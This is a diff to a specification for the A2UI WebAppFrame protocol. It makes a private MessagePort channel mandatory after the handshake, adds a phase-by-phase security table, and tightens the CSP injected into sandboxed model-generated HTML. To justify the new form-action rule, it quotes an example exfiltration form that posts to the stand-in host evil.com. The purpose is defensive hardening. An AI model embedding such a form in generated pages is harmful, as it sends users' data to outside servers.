@@ -62,15 +62,20 @@ layers:
 
 # 3. The WebAppFrame runtime and communication contract
 
-While simple, LLM-generated applications can use raw, fire-and-forget `window.postMessage` events
-for zero-dependency execution, **human developers should use the official `@a2ui/web-bridge` SDK
-(coming soon)** (or equivalent).
+To prevent compromised frames from spoofing ambient messages, the A2UI protocol strictly requires the use of a private `MessageChannel` for all post-initialization communication between the embedded application and the host.
 
-The `@a2ui/web-bridge` SDK establishes a private `MessageChannel` between the host and the iframe
-and wraps the underlying protocol into a secure, type-safe, and Promise-based API. This hides the
-complexity of request correlation, deep-equality checks, and message origin validation.
+The `@a2ui/web-bridge` SDK (coming soon) establishes this channel automatically and wraps the underlying protocol into a secure, type-safe, and Promise-based API. However, even for zero-dependency or LLM-generated scripts written in raw HTML/JS, the developer or LLM **must** extract the `MessagePort` provided by the host during the `a2ui_app_frame_init` handshake event (typically found at `event.ports[0]`) and use it for all subsequent events. Ambient `window.postMessage` is exclusively reserved for the initial handshake and will be ignored for data and action routing.
 
-However, at the wire level, all communications occur using custom top-level message string tags
+### Transport Layers & Security Enforcement
+
+Because the communication lifecycle transitions from a public broadcast to a private pipe, different security measures apply depending on the phase:
+
+| Phase                             | Message Types                                                                                            | Transport Mechanism          | Required Security Measures                                                                                                                                                                                                                     |
+| :-------------------------------- | :------------------------------------------------------------------------------------------------------- | :--------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Bootstrap & Handshake**         | `a2ui_sandbox_proxy_ready`, `a2ui_sandbox_resource_ready`, `a2ui_app_frame_ready`, `a2ui_app_frame_init` | Ambient `window.postMessage` | **Strict Origin/Source Verification Required:** The host must verify `event.origin` and `event.source === iframe.contentWindow`. The embedded app must verify the host's `event.origin` before accepting the `MessagePort`.                    |
+| **Post-Initialization (Routing)** | `a2ui_action`, `a2ui_data_model_change`, `a2ui_function_call`, `a2ui_size_changed`, etc.                 | Dedicated `MessagePort`      | **No Origin Verification Needed:** The `MessageChannel` is a direct point-to-point pipe. Messages arriving on the port are implicitly secure. However, **Schema Validation** (Section 5.5) is strictly enforced by the host on these payloads. |
+
+At the wire level, all communications occur using custom top-level message string tags
 (`a2ui_*`) with flat keys. The protocol definitions below represent this underlying wire format.
 
 ## 3.1. Sandbox bootstrap lifecycle
@@ -140,7 +145,7 @@ sequenceDiagram
    configuration (`config`), the initial state of the bound data model (`initialData`), and lists
    of authorized actions and client functions. **Host clients must also transfer a `MessagePort`
    (e.g., `event.ports[0]`)** with this message to establish the dedicated 1-to-1 communication
-   bridge for the `@a2ui/web-bridge` SDK.
+   bridge for all subsequent data and event messages.
    ```json
    {
      "type": "a2ui_app_frame_init",
@@ -166,6 +171,8 @@ sequenceDiagram
    ```
 
 ## 3.3. Outgoing messages (Embedded app to host)
+
+Once the initial handshake is complete, all subsequent outgoing messages from the embedded application must be dispatched using the `postMessage` method of the `MessagePort` received during the `a2ui_app_frame_init` handshake (e.g., `hostPort.postMessage({ ... })`). Ambient `window.parent.postMessage` must not be used after the initialization handshake.
 
 ### A. Event dispatch (`a2ui_action`)
 
@@ -448,7 +455,7 @@ Used to load standalone, sandboxed, model-generated HTML/JS layouts.
       },
       "htmlContent": {
         "type": "string",
-        "description": "The raw HTML string to render via srcdoc."
+        "description": "The raw HTML string to render via srcdoc. Can be URL-encoded."
       },
       "config": {
         "type": "object",
@@ -467,6 +474,9 @@ Used to load standalone, sandboxed, model-generated HTML/JS layouts.
         },
         "required": ["paths"],
         "additionalProperties": false
+      },
+      "height": {
+        "$ref": "common_types.json#/$defs/DynamicNumber"
       },
       "allowedEvents": {
         "type": "object",
@@ -582,7 +592,12 @@ Sandbox to prevent CSRF and exfiltration.
 - **Strict CSP Meta Tag Injection:** Unlike `WebAppFrameUrl`, the renderer receives the raw HTML
   string. It must parse the HTML, strip any author-supplied CSP meta tags, and inject a strict CSP
   meta tag as the first child of the head:
-  `<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data:; connect-src 'none';">`.
+  `<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data:; connect-src 'none'; form-action 'none';">`.
+- **Form-Based Exfiltration Prevention (`form-action 'none'`):** When `allow-forms` is included in
+  the iframe sandbox attributes (to allow local interactive form controls), untrusted scripts in
+  `WebAppFrameSrcdoc` could attempt to submit an HTML form (`<form action="https://evil.com/post" method="POST">`)
+  to an external server. Because `connect-src 'none'` only blocks APIs like `fetch` and `XMLHttpRequest`,
+  injecting `form-action 'none';` closes HTML form navigation and submission bypasses.
 - **Double-Iframe Sandboxing (Web Platforms):** A single layer iframe does not offer good isolation.
   Web renderers must load raw HTML via a nested proxy frame (e.g., A2UI Sandbox Proxy). The outer
   same-origin proxy coordinates message transfers, while the inner iframe is strictly sandboxed
@@ -627,11 +642,9 @@ The initialization payload must define:
 
 ### 5.5.2. The Interception & Validation Flow
 
-When the embedded app dispatches a window.postMessage event, the WebAppFrame component executes the
-following pipeline before interacting with the host's surface or the backend:
+When the embedded app dispatches a message over the dedicated `MessagePort`, the WebAppFrame component executes the following pipeline before interacting with the host's surface or the backend:
 
-- **Origin Check:** The component verifies that `event.origin` matches the expected allowlisted
-  origin of the iframe.
+- **Origin Check (Fallback):** The component verifies that `event.origin` matches the expected allowlisted origin (if available via the port).
 - **Schema Enforcement:**
   - _For `a2ui_action`:_ The component looks up the `action` string in `allowedEvents`. It runs the
     `data` payload against the associated schema (e.g., using a JSON Schema validator).
@@ -677,8 +690,7 @@ from applying this bypass to external or untrusted iframe URLs.
 
 # 6. Implementation guidelines
 
-- **Developer SDK (`@a2ui/web-bridge` - Coming Soon):** While raw `postMessage` is specified for
-  zero-dependency AI generation, human developers building `WebAppFrameUrl` targets should import
+- **Developer SDK (`@a2ui/web-bridge` - Coming Soon):** While raw `MessagePort` bindings are required for zero-dependency AI generation, human developers building `WebAppFrameUrl` targets should import
   the official `@a2ui/web-bridge` SDK (coming soon) to wrap the communication in a secure
   `MessageChannel` with Promise-based function invocations.
 - **SafeContentFrame / Double-Iframe Sandboxing:** A single layer iframe does not offer good
